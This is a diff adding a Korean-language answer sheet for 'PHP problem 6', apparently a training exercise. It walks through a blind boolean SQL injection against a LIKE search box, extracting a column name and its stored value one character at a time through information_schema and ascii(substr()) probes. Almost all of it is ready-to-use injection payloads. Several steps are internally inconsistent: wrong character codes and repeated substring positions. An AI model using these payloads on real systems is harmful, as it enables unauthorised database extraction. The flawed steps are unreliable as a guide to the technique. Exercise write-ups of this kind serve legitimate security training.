@@ -1,0 +1,86 @@
+PHP 문제 6번 답안
+
+검색어 
+참 : a%' and '1%''= 1 
+거짓 : a%' and '1%'='2
+
+
+
+공격 쿼리: a%' and (__공격 쿼리__) and '1%' = '1
+
+1. 공격에 사용한 구문
+
+((select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 'answer') > 0)
+
+**컬럼 글자 수 : 6**
+
+a%' and ((select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 'answer') > 0) and '1%' = '1
+
+a%' and ((select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 'answer') = 6) and '1%' = '1
+
+**컬럼 명 구하기 : answer**
+
+--1번째 글자--
+a%' and ((select ascii(substr(COLUMN_NAME,1,1)) from information_schema.COLUMNS where TABLE_NAME = 'answer') = 97) and '1%' = '1
+
+chr(97) -> a
+
+--2번째 글자--
+a%' and ((select ascii(substr(COLUMN_NAME,2,1)) from information_schema.COLUMNS where TABLE_NAME = 'answer') = 110) and '1%' = '1
+chr(110) -> n
+
+--3번째 글자--
+a%' and ((select ascii(substr(COLUMN_NAME,3,1)) from information_schema.COLUMNS where TABLE_NAME = 'answer') =115) and '1%' = '1
+
+chr(115) -> s
+
+--4번째 글자--
+a%' and ((select ascii(substr(COLUMN_NAME,4,1)) from information_schema.COLUMNS where TABLE_NAME = 'answer') = 119) and '1%' = '1
+chr(119) -> w
+
+--5번째 글자--
+a%' and ((select ascii(substr(COLUMN_NAME,5,1)) from information_schema.COLUMNS where TABLE_NAME = 'answer') = 101) and '1%' = '1
+chr(119) -> e
+
+--6번째 글자--
+a%' and ((select ascii(substr(COLUMN_NAME,6,1)) from information_schema.COLUMNS where TABLE_NAME = 'answer') = 114) and '1%' = '1
+
+chr(114) -> r
+
+** answer 컬럼 안에 데이터 구하기**
+
+**row 가 1개 인것을 파악**
+select count (1) from answer
+a%' and ((select count(1) from answer) >0) and '1%' = '1
+a%' and ((select count(1) from answer) =1) and '1%' = '1
+
+**row의 글자 수 : 4 파악**
+a%' and ((select length(answer) from answer) =4) and '1%' = '1
+
+**row 글자 구하기**
+
+--1번째 글자--
+a%' and ((select ascii(substr(answer,1,1)) from answer) = 97) and '1%' = '1
+chr(97) -> a
+
+--2번째 글자--
+a%' and ((select ascii(substr(answer,2,1)) from answer) = 98) and '1%' = '1
+chr(98) -> b
+
+--3번째 글자--
+a%' and ((select ascii(substr(answer,1,1)) from answer) = 99) and '1%' = '1
+chr(97) -> c
+
+--4번째 글자--
+a%' and ((select ascii(substr(answer,2,1)) from answer) = 100) and '1%' = '1
+chr(100) -> d
+
+2. 정답
+
+abcd
+
+** 부록 **
+
+d 입력으로
+
+결과가 나오면 쿼리문이'%__%' 이렇게 되어있다고 유추할 수 있다.
